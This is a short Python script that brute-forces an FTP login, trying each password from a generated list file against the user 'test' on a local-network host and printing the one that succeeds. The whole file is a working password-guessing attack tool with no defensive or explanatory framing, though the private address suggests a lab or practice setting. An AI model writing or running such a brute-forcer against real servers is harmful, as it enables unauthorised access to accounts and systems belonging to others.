import ftplib


def check_pass(host: str, pass_list: list):
    for passwd in pass_list:
        try:
            ftp = ftplib.FTP(host)
            ftp.login("test", passwd)
            print("password:", passwd)
            break
        except:
            print("ERROR")
    return ""


host = "192.168.0.105"
pass_list = [x.strip() for x in open("pass_gen.txt", "r")]
check_pass(host, pass_list)